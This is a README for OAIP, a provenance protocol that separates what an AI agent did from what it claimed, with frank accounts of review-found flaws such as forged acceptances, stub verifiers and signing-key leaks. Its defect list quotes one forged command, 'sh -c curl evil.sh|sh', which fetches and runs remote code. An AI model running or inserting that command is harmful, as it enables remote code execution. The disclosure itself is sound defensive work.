# OAIP — Observed Action & Intent Protocol

> A record of what an AI agent actually *did*, separate from what it claimed and
> separate from whether anyone accepted the claim. An **Intent** says what was
> attempted; an **Execution** records the invocation with before/after workspace
> snapshots; **Effects** are the per-file changes; an **Attribution** links a
> change to an actor with declared confidence; a **ClaimCandidate** is a claim
> about the result — and a claim is *never* accepted by this protocol. Acceptance
> is a signed [Warrant](https://github.com/s0fractal/warrant) record, which is a
> different object with a different trust model.

This file exists so that a reader — human or model — does not have to infer the
things below from source. Everything in it is checkable in one command.

## The single most important rule (SPEC §4)

**Execution success is not validation, and validation is not acceptance.**
`exit_code == 0` earns nothing. A claim runs a *separate* validation check, and
only a signed Warrant record accepts it. A refusal is a record, not the absence
of one.

If you take one thing from this file: any reading of OAIP where a successful
command implies an accepted claim is wrong, and the end-to-end demo prints the
refusal on purpose.

## Check anything in one command

Nothing here asks to be believed. Offline, stdlib only, no account:

```bash
python3 tools/check.py                  # everything, one verdict
python3 tools/check.py --list           # what runs, what it needs, what it must print
python3 tools/check.py --allow-unrun    # tolerate a missing Warrant checkout
```

A check that **could not run** is reported as `UNRUN` and exits 2 — never as a
pass. That distinction is load-bearing here: `tools/intoto.py selftest` used to
print `SKIP … ledger has no claims` and exit 0 in any clean checkout, which is the
only outcome it could ever have produced in CI.

Warrant is a **normative dependency**, not an optional extra (§1 defines
canonicalization as "exactly per Warrant SPEC §4"; §3 makes the decision layer a
real Warrant record). Set `WARRANT_IMPL` / `WARRANT_CLI`, or keep a checkout at
`~/Projects/warrant`.

## Interoperating with the provenance world

OAIP's observation records overlap with existing standards, and pretending
otherwise would be a strategic error. The honest map:

| OAIP | Existing equivalent |
|---|---|
| Execution | SLSA `runDetails` / an OpenTelemetry span |
| Effect | SLSA byproducts / materials |
| Artifact, State | in-toto ResourceDescriptor |
| ClaimCandidate | in-toto Statement |

```bash
python3 tools/intoto.py wrap <claim-id>     # → in-toto Statement v1
python3 tools/intoto.py check <file>        # does it bind to this ledger?
```

`predicateType` is `https://github.com/s0fractal/oaip/claimcandidate/v0` — a URI
this project controls, deliberately not a domain it does not own. The Statement is
**not** signed by the converter: DSSE wrapping and Rekor submission are separate
steps with separate trust.

What neither in-toto nor SLSA has, and why OAIP is not simply deleted in their
favour: the **acceptance boundary** (they attest what happened; neither can
express "this ran, and was refused") and **attribution with declared
uncertainty** (`confidence_ppm` as an integer, with `method` naming how the causal
link was drawn).

## Where the honest gaps are

Listed because a reviewer will find them anyway, and finding them listed is
better evidence of good faith than finding them hidden.

Four rounds of fresh-context adversarial review (a Claude-family reviewer — **not
an independent gate, and nothing here is adopted by any warrant**) have now
broken this repository's defences repeatedly, and the second round's central
finding was that the first round's *fixes* had only narrowed the defects while
this file described them as closed. So the entries below say what is **enforced**
and by **whose** rule, separately from what is merely reported — and where a
property is not enforced at all, that is written down rather than implied away.

The fourth round attacked the hand-written Ed25519 verifier itself and could not
break it; its findings were all in the code that FEEDS the verifier — how much
work an attacker can make it do, how much of its output a human can still read,
and what happens to a refusal that raises instead of returning. Both halves of
that result are recorded below, the favourable one included.

- **CLOSED 2026-07-30 (was: the spec and the implementation disagreed on every
  record type).** The divergence was total, not only the §2.4 case this file used
  to admit: Intent, State (which did not exist in the implementation at all),
  Execution, Attribution, Effect and ClaimCandidate all differed in fields and in
  type tag, and the conformance vectors pinned only the canonicalization
  function, so both halves reported ALL PASS throughout. The implementation was
  moved to SPEC §2; four places where the SPEC was wrong were changed instead and
  are named in the commit body (`invocation` is an array because a joined string
  cannot reconstruct argv; three member names collided with type tags;
  Effect/Attribution had no `id`; `ski@v1` is reserved rather than admitted in
  claim 0.1). `examples/record-vectors.json` now pins the record SHAPES, positive
  and negative, and `tools/intoto.py` follows the specification with no comment
  explaining why it does not.

  What is NOT closed by that: the vectors are checked by one implementation
  against itself. A second implementation is what would make "conformant" mean
  something, and there is still only one.
- **The fingerprints are reproducible, and thin.** `env_fingerprint` and
  `toolchain_fingerprint` were undefined — a second implementation could not
  compute a StateID at all. They are now SHA-256 over `environment_probe` /
  `toolchain_probe` records under the registered profile `posix-base@v1`, whose
  scope is five environment variables (PATH, LANG, LC_ALL, TZ,
  SOURCE_DATE_EPOCH) and one tool probe (`git --version`). SPEC §2.2.1 says in as
  many words that any other variable can change what a command does without
  changing this number: it is a discriminator, not evidence of environmental
  equivalence. A verifier that cannot re-run the probes reports
  `unreproducible`, which §2.2.4 forbids collapsing into `matched`. `oaip
  verify` re-runs the probes and prints the three-way count; on the host that
  wrote the records they match, a State the current environment no longer
  reproduces is `mismatched` and NOT an error (environments change; a State says
  what was observed then), and a pre-0.1 execution is `unreproducible` because
  it carries no State at all. What is NOT tested anywhere: the cross-host case,
  where the answer should be `unreproducible` for every State and this
  implementation would instead report `mismatched`, because it re-runs the
  probes unconditionally rather than asking whether it is the same host.
- **One implementation.** Warrant has three that agree on broken stores; OAIP has
  Python only. Until a second exists, "conformant" here means "agrees with
  itself". This is the reason the negative vectors below were written first: a
  second implementation that agreed only on well-formed records would prove
  nothing.
- **Attribution is exclusive-window only.** §2 requires that a weaker method (it
  names a File-Watcher-only guess) carry a lower `confidence_ppm` *and its own
  `method`* — so the format provides for uncertain causality. The reference
  implementation only ever wraps the command, i.e. it emits the one method it can
  claim honestly and never exercises the low-confidence path. The hard case is
  specified, not implemented.
- **No signing of OAIP records themselves.** Integrity comes from
  content-addressing plus the Warrant record at the decision layer; the artifacts
  are not individually signed. In particular a `claim@v1` record is unsigned, so
  "which claim exists" is a property of the artifact directory, not of anyone's
  key — which is why the acceptance link is pinned inside the *signed* warrant
  body rather than inferred from the claim side.
- **Concurrency is serialised, not concurrent.** `oaip accept` and `oaip rebuild`
  take an advisory `flock` on `.oaip/lock`, rebuild builds under a temporary name
  and `os.replace`s it into place, and the acceptance edge is
  `UNIQUE(claim_id, warrant_id)`. Before that, four concurrent rebuilds wrote
  four identical edges for one store record and a concurrent accept + rebuild
  raised an uncaught `sqlite3.OperationalError` and lost the insert. On a
  platform without `fcntl` the lock degrades to nothing; the constraint and the
  atomic rename still hold. No attempt is made to be safe against a process that
  crashes mid-`accept`.
- **§5 rebuild reconstructs the projection, never the Warrant store.** `oaip
  rebuild` reads both halves of the canonical layer — `.oaip/artifacts` plus the
  Warrant store — and re-derives the claim→warrant acceptance edge from the
  store's `accept` records (it did not until 2026-07-30: the `warrants` table was
  never repopulated, so `oaip log` lost its WARRANT line at the first rebuild).
  The store itself is canonical, signed, and is not — cannot be — rebuilt.
- **What actually gates an acceptance edge, and what does not.** Two rounds of
  fresh-context adversarial review (a Claude-family reviewer — not an independent
  gate, and not adopted by any warrant) broke the edge derivation four times.
  Stated per layer, because the earlier summary here ("rebuild now has the
  Warrant CLI verify the store before deriving any edge, and fails closed")
  claimed a closure it did not have:
  - *Address-matching* (`sha256(canon(body)) == filename`) is satisfied by
    construction by anyone who can write a file. It establishes nothing about who
    decided; a hand-written `accept` with junk signatures passed it.
  - *`warrant verify` exiting 0* is also not enough, twice over.
    `WARRANT_CLI=/usr/bin/true` exits 0 having verified nothing, so OAIP requires
    a parseable `warrant.verify-report@v0` and bounds every call in time.
    And a **cryptographically valid signature by a key nobody vouches for still
    exits 0** — Warrant SPEC §5 puts key↔actor binding out of scope and §5.1
    makes bound/unbound "a report". `warrant keygen` + one `accept` therefore
    forged an acceptance for a claim nobody accepted, under any actor id.
  - *A shape check on that report is NOT an identity check*, and a commit on this
    branch wrongly called it one. The third review round wrote a four-line stub
    that prints a clean `warrant.verify-report@v0` and, with a forged accept
    naming this ledger's real public key and `"sig": "abab…"` (no secret needed),
    got `oaip rebuild` to exit 0, derive the edge, and `oaip log` to print
    "(signed decision)" — via `$WARRANT_CLI` **and** by planting the stub at the
    unpinned default path `~/Projects/warrant/impl/warrant.py`.
  - *Ed25519 verification is now OAIP's own, in process* (`ed25519_verify`, RFC
    8032, stdlib integer arithmetic, verify-only — no secret is ever handled).
    The signature that decides must verify against the WarrantID **OAIP
    recomputed from the record's own bytes** before any edge is derived. That is
    why no program named by `$WARRANT_CLI` can manufacture an acceptance any
    more; Warrant is still consulted and its errors still refuse a rebuild — a
    delegate may veto, it may not vouch. `oaip accept` verifies the record it
    just asked the CLI to sign, before recording anything: OAIP holds no signer,
    so it cannot avoid delegating the SIGNING, but it does not take the result on
    trust either.

    **That hand-written verifier has been differentially verified against two
    independent implementations, and it held.** A fourth fresh-context
    adversarial round (a Claude-family reviewer — still not an independent gate,
    still not adopted) set out to break the arithmetic and reported instead:
    **270,347 differential cases** across three implementations — this one,
    OpenSSL via `cryptography`, and Warrant's separate from-scratch Rust verifier
    — with **0 disagreements**; RFC 8032 §7.1 test vectors 5/5, with 35/35
    negative mutations rejected; the acceptance criteria identical to Warrant's
    in all 12 compared rows (the small-order blocklist byte-identical, the same
    cofactorless verification equation, `S < L` enforced, non-canonical `y` and
    non-canonical `R` refused); and independently constructed
    cofactor-discriminating vectors rejected by all three. Positive agreement
    alone would prove little — an implementation that accepts everything agrees
    with everyone — which is why the negatives and the criteria table are the
    load-bearing half. **What this does not establish:** it is agreement, not
    proof; the three implementations were compared on inputs, not verified
    against the specification line by line; and side-channel resistance is not
    claimed or needed (verification handles no secret).

    **What it costs: this verifier is ~65x slower than OpenSSL** (measured here,
    2.76 ms vs 0.043 ms per signature). Standing alone with no dependency is
    worth that, but the asymmetry is real, and it was an availability defect
    before it was a cost: `sigs` sits OUTSIDE the hashed body, so anyone who can
    write the store could append unlimited entries to an HONEST record without
    breaking its address, and every one of them was verified on every rebuild
    and every verify (5,000 appended entries: 8.61 s vs 0.15 s, and 10,000 NOTE
    lines burying the diagnosis). Now only an entry that names the record's actor
    AND a key already bound to that actor is verified at all — both string
    comparisons — so an honest record costs ONE verification however much is
    appended after it; the remaining per-signature gap is unchanged and simply
    paid at most a bounded number of times per record (`SIG_DECIDE_CAP = 32`,
    `SIG_NOTE_CAP = 8` collapsing the notes to a count, `MAX_STORE_RECORD_BYTES
    = 4 MiB` refusing a padded record before parsing it).

    **What the caps cost, stated because a bound is also a limit.** APPENDING
    cannot un-decide anything — the honest signature is reached first, which is
    the property Warrant SPEC §5 requires and `tests/signature_gate.py` asserts
    under a 5,000-entry flood. But someone who REWRITES a record can reorder it,
    and more than 32 entries naming the record's actor with a bound key, none of
    them valid, ahead of the real one is a refusal: measured, `oaip rebuild`
    then exits 1 with "more than 32 signature entries name actor 'tester@local'
    … refusing to keep verifying" and reports the lost edge loudly. That is
    fail-closed and it is a real griefing surface — bounded by the same store
    write access that already allows deleting the record outright, which is
    equally loud and equally destructive. A record padded past 4 MiB refuses the
    whole rebuild for the same reason and with the same trade-off.
  - *Binding* is enforced alongside it, and it is **OAIP's own rule, not
    Warrant's**: an acceptance edge is derived only if the signature is valid AND
    names a key bound to the actor it claims in `.oaip/trust.json`, which only
    `oaip accept` and `oaip bind` ever write. `oaip verify` reports an
    unbound signer on an OAIP acceptance as an error. What OAIP cannot do:
    Warrant's `--trust-config` grade reports the same finding but by
    specification never fails on it, and its machine-readable report omits the
    finding entirely in quiet mode — so it is used as corroboration only.
  - *The signature that must be valid and bound is the one by the actor the
    record NAMES* (`body.actor.id`) — not every signature on it. Demanding all of
    them handed a deletion primitive to anyone with store write access: Warrant
    SPEC §5 permits appending a co-signature and will not let a junk one
    invalidate a good record, so one appended, cryptographically VALID co-sig by
    a second endorser left `warrant verify` at 0 errors and made `oaip rebuild`
    print `warrant=0` **and exit 0**, deleting the acceptance edge and the
    WARRANT line in `oaip log`. Extra signatures are now reported as `NOTE`s;
    they endorse, they do not decide, and they cannot un-decide.
  - *A rebuild that drops an edge the previous projection asserted exits
    non-zero* and names each lost edge with the reason it was refused. §5's
    promise is "the same graph"; when a rebuild cannot keep it, the exit status
    must not say otherwise.
  - *A refused rebuild withdraws the projection's authority.* The refusal leaves
    the projection's bytes alone (fail-closed must not mean destroy-first), but
    writes `.oaip/projection.untrusted`, and `oaip log` / `oaip verify` then
    refuse it until a rebuild succeeds. Before that, a projection built once from
    a poisoned store kept printing "(signed decision)" forever, because every
    later honest rebuild refused and changed nothing.
  - *Which claim* was accepted is read from the signed `subject.note`
    (`oaip-claim:<id>`), not guessed from the subject hash: the subject
    `{predicate, execution, effects}` excludes the check command and verdict, so
    `--check true` and `--check false` over one execution collide, and hash
    matching projected one signed acceptance onto a claim whose check FAILED.
    The note is now **mandatory**, and the prefix is matched case-insensitively.
    The earlier "legacy records fall back to subject-hash matching" was
    attacker-selectable — omitting the note, or spelling it `OAIP-CLAIM:`, chose
    the weaker path on demand in a brand-new store. The fallback now requires
    **both** `oaip rebuild --allow-legacy-links` (an operator opt-in that prints
    what the guess can get wrong) **and** a record older than the moment this
    store began requiring the note, stamped by `oaip init` in
    `.oaip/store.json` — a criterion the filer of a record cannot choose. In a
    store created by a current `oaip init` there are no eligible records at all.
    A `.oaip/store.json` that is present but UNREADABLE (truncated, wrong type,
    missing field, not a file) is now a refusal: it used to be read as "this
    store predates the convention", so one corrupt byte promoted a brand-new
    store to a legacy one and `--allow-legacy-links` ran the guess while
    printing that the store had no marker.
  - *Binding a key that is not this ledger's own* (`.oaip/dev.key.pub`) requires
    `oaip bind --foreign-key` and prints a warning naming what OAIP cannot do
    with it (custody it, revoke it). `bind` used to accept any hex64 with no
    cross-check at all — the one command whose purpose is to say which key may
    sign was the least careful about which key that was. It also used to accept a
    key that could never sign: `oaip bind --key 0100…00 --foreign-key` wrote a
    small-order key into the keyring at rc=0. It now applies this project's own
    key-validity rule (`weak_ed25519_pubkey`, Warrant SPEC §5) — defence in
    depth, since `ed25519_verify` refuses every signature under such a key
    anyway, but a keyring entry that can decide nothing is a false statement
    about custody.
  - **Still outside OAIP's control:** `.oaip/trust.json` lives beside
    `.oaip/dev.key`, so **anyone who can write `.oaip/`** can write the keyring
    *and* the signing key — the binding raises the bar from "can run `keygen`" to
    "can write `.oaip/`", it does not make acceptance unforgeable. Until the
    third review round the boundary was wider than that: it was "can write
    `.oaip/`, **or can influence what `$WARRANT_CLI` resolves to**" — the
    environment variable, or the unpinned sibling checkout at
    `~/Projects/warrant/impl/warrant.py`, neither of which is inside `.oaip/`.
    That half is closed: signature validity is decided in process now, so a
    hostile `$WARRANT_CLI` can make OAIP refuse (by reporting errors, or by not
    being a Warrant verifier at all) but cannot make it derive an edge. What it
    can still hide is everything OAIP does *not* recompute — Warrant's schema,
    blob-reference and DAG/policy findings — so a stub silently costs
    corroboration on those. There is no out-of-band trust root, no key rotation,
    and no revocation. Two SUPPORTED claims with byte-identical subjects still
    cannot be told apart for legacy records.
- **The snapshot's `.oaip` exclusion has been broken four times by review**, and
  every break was a different way of giving the ledger a name the exclusion did
  not match:
  1. a NESTED ledger (`sub/.oaip/dev.key`, from `oaip init` in a subdirectory)
     was added like any other file;
  2. the pathspecs were cwd-RELATIVE, which both leaked a HEAD-tracked root
     ledger when run from a subdirectory and silently narrowed the "full
     worktree" snapshot to the cwd subtree;
  3. the pathspec matched case-SENSITIVELY, so on the case-INSENSITIVE filesystem
     this project is developed on the key leaked as `.OAIP/dev.key` — and
     `tests/key_custody.py`'s own detector was case-sensitive in exactly the same
     way, so it could not see that;
  4. a SYMLINKED ledger (`ln -s ledgerstore .oaip`) put the key back in
     `.git/objects` under the target's name, and `oaip init` followed the symlink
     silently.

  The pathspecs are now repo-rooted, depth-agnostic and case-insensitive
  (`:/`, `:(top,exclude,glob,icase)**/.oaip/**`); `init` refuses a symlinked
  ledger, and the snapshot excludes a symlink's target as well and says so
  loudly.

  **What `icase` costs, stated because it is an observation hole and not only a
  protection:** the exclusion drops **any** path whose component case-folds to
  `.oaip` — at any depth, on any filesystem, whoever created it. A user's own
  `src/.Oaip/config.yml` is therefore never in a snapshot and no effect over it
  is ever attributed. That was silent until the third review round; the snapshot
  now NAMES every excluded path that is not a ledger (compared by inode, so
  `.OAIP/dev.key` on a case-insensitive filesystem is correctly recognised as
  this ledger, and a nested `sub/.oaip/` as another one). The exclusion itself
  stays: leaving things out is the safe direction for a signing key. What is claimed is exactly what `tests/key_custody.py` executes: root
  and nested ledgers, from root and from a subdirectory, tracked and untracked,
  `.oaip` and `.OAIP`, real directory and symlink. **It is not a claim that no
  arrangement of a git repository can defeat it — four arrangements already did,
  and the exclusion is still fundamentally by name.** A hardlinked file, a
  `core.excludesFile` interaction, or a ledger reached through a symlinked
  *parent* directory have not been tested.
- **Migration: a store created before this keyring existed will lose its
  acceptance edges at the next rebuild**, because nothing vouches for the key
  that signed its accepts. That is fail-closed on purpose, and the recovery is
  one explicit command: `oaip bind --actor <id> --key <hex64>` (the `key` field
  of a signature in `.oaip/warrants/records/`). Naming the key is the operator's
  assertion, not OAIP's discovery, which is why it is not done automatically.
- **What the second review round did NOT close.** Beyond the binding gap above:
  a `claim@v1` artifact is unsigned and unauthenticated, so anyone who can write
  `.oaip/artifacts` can add a claim record — the acceptance side is now pinned to
  a signed note, but the claim side is not. And the check `.oaip/store.json` uses
  to separate "legacy" from "should have carried a link" rests on a signed `ts`,
  which someone holding the ledger's key could choose.
- **`verify` and `rebuild` now audit the same accepts** — which they did not
  until the fourth round. `rebuild` assessed the signer of EVERY accept;
  `verify` assessed only those carrying an `oaip-claim:` note, so a note-less
  accept with a broken signature made `rebuild` print a WARN and `verify` print
  nothing at all, while `--allow-legacy-links` could derive an edge from exactly
  that class of record. The set is the same now; only the severity depends on the
  note (an accept naming an OAIP claim, or carrying a claim's subject hash, is an
  ERROR when its signer cannot be established; another ledger's decision sharing
  the store is a WARN, as `rebuild` reports it, and not an accusation).
- **A deeply nested document used to produce a traceback instead of a refusal,
  and left the projection trusted.** ~1,000 levels of nesting in a ~2 KB
  envelope raised `RecursionError` out of `json.loads` and the I-JSON walkers;
  no caller caught it, so `oaip rebuild` crashed BEFORE it could mark the
  projection untrusted and `oaip log` kept printing "(signed decision)" from a
  stale projection with no marker. Pre-existing on main, not introduced by the
  review branch, and the fourth instance of the same class ("a refusal is a
  decision, a traceback is an accident"). Depth is now part of the declared
  domain: `loads_ijson` converts it to the same `ValueError` every reader already
  handles.

## Conformance vectors, including the negative half

There are TWO vector files, and the second one did not exist until 2026-07-30.
`examples/vectors.json` pins how a record SERIALIZES;
`examples/record-vectors.json` pins what a record IS. Passing only the first
means two implementations agree about JSON, not about the protocol — which is
exactly the state this repository was in while the reference implementation
wrote a different record from SPEC §2 for every type in it.

`examples/record-vectors.json` (SPEC §10): 33 records that MUST validate and 83
documents that MUST NOT, each pinned with the OUTCOME it must produce — because
`invalid`, `unsupported-version`, `unknown-type`, `legacy` and `not-a-record`
are five outcomes and not two, and returning one for another is a real
interoperability bug a boolean assertion would hide. The reject half is grouped
by class: `shape` (35) is the group a canonicalization vector cannot reach —
impeccable JCS I-JSON whose shape is wrong (an unregistered effect kind, a
`killed` process carrying an exit code, an attribution claiming a certainty its
method may not claim); `missing-member` (15), `wrong-type` (11),
`unknown-member` (8, i.e. closed schemas), `type-tag` (11, version negotiation
and the legacy tag) and `bytes` (3, refused at ingestion rather than at the
shape layer). Confirmed meaningful by weakening the validator two ways: dropping
the unknown-member test scores 108/116, and accepting every object scores
47/116.

`examples/vectors.json` carries two kinds:

- **`records`** — canonical bytes and their SHA-256, byte-exact.
- **`reject`** — 25 byte sequences a conforming implementation MUST refuse.
  `class=not-ijson` (17) is valid JSON that I-JSON forbids: duplicate member
  names, `NaN`/`Infinity`, lone surrogates, floats anywhere, a leading BOM. That
  group is the one that actually splits implementations. `class=not-json` (8)
  fails in any correct parser and is present so a failure can be told apart from a
  strictness gap.

Positive vectors alone cannot establish conformance: **an implementation that
accepts everything passes every positive vector.**

On the BOM specifically: RFC 8259 §8.1 lets a receiver ignore one, so rejecting it
is a deliberate narrowing rather than a grammar rule. "MAY ignore" is unaffordable
in a content-addressed format — the same record would have two addresses. Measured:
Python's `json.loads` strips a BOM from *bytes*, Go's `encoding/json` rejects it.

## Defects found in this repository, and how

Kept because the pattern is more useful than the list, and because a project that
reports only its successes is not reporting.

The recurring class is **checking something adjacent to the evidence**:

- `oaip verify` shelled out to `warrant verify` on the neighbouring decision store
  and examined **no byte** of `.oaip/artifacts` — the layer §5 calls the truth.
  With all three canonical records forged it printed `0 errors` and exited 0.
- Every reader of the canonical layer used bare `json.loads(read_bytes())` and
  never recomputed the address. An execution record's `command` was rewritten to
  `sh -c curl evil.sh|sh`; `rebuild` reported success and the projection asserted
  the forged command while the file still sat under its original name. Content-
  addressed storage whose reader never checks the address is a directory of files
  with long names.
- `tests/projection_rebuild.py` could not have caught either one: it only ever
  rebuilds from an **honest** artifact directory. Integrity is a claim about the
  tampered cases — which is why `tests/canonical_layer.py` tampers in every case,
  and why its own fix was verified by reverting it (17 of 20 cases fail against
  the pre-fix implementation).

And the more specific class, which has now cost this repository three separate
facts: **a test whose detector shares the bug's blind spot.**

- `TABLES` in `tests/projection_rebuild.py` omitted `warrants`, so the projection
  could lose the claim→warrant acceptance edge on rebuild and the comparison
  reported "identical". Fixed — and then `TABLES` still omitted `artifacts`, so
  rebuild could rewrite every artifact's `kind` to `"rebuilt"` on a clean honest
  store and the comparison reported "identical" again. The tuple is now checked
  against `sqlite_master`, so the next table cannot be added and forgotten.
- `oaip_paths_in()` in `tests/key_custody.py` matched `".oaip"` case-sensitively —
  the same blind spot as the pathspec it was testing — so it could not see the key
  leaking as `.OAIP/dev.key` on the very filesystem this project is developed on.

A third class, which the fourth round is entirely about: **a check that is
correct and unbounded.** Every signature entry on a record was verified before
anything was decided, and `sigs` is outside the hashed body — so the correct
check ran as many times as an attacker chose (5,000 appended entries: `oaip
rebuild` 8.61 s against 0.15 s, `warrant verify` 0.28 s over the same file), and
printed 10,000 notes that buried the one line a human needed. Correctness says
nothing about how often, and a security check nobody can afford to run — or
whose output nobody can read — is not a check that is being made.

The lesson that generalises: after fixing a leak, revert the fix and check that
the test fails. Every case added in the two review rounds above was confirmed RED
that way, and the observed failure text is in the commit that fixed it.
- A commit message claimed the CI wiring was fixed; it had wired one of two new
  tests, because the workflow listed steps by hand. CI now runs `tools/check.py`
  and the membership lives in one place.

## The specification

[SPEC.md](SPEC.md) — §1 canonicalization and identity, §2 record types, §3 the
Warrant bridge, §4 the cardinal rule, §5 canonical layer vs projection.

Read §4 and §5 before anything else. They are the two places where a plausible
misreading leads to a wrong conclusion about the whole design.

## Reporting a defect

Open an issue with the bytes and the command. A reproduction beats a description,
and a cleared suspicion is a useful result — several of the checks above exist
because a suspicion was raised, tested, and turned out to be wrong.
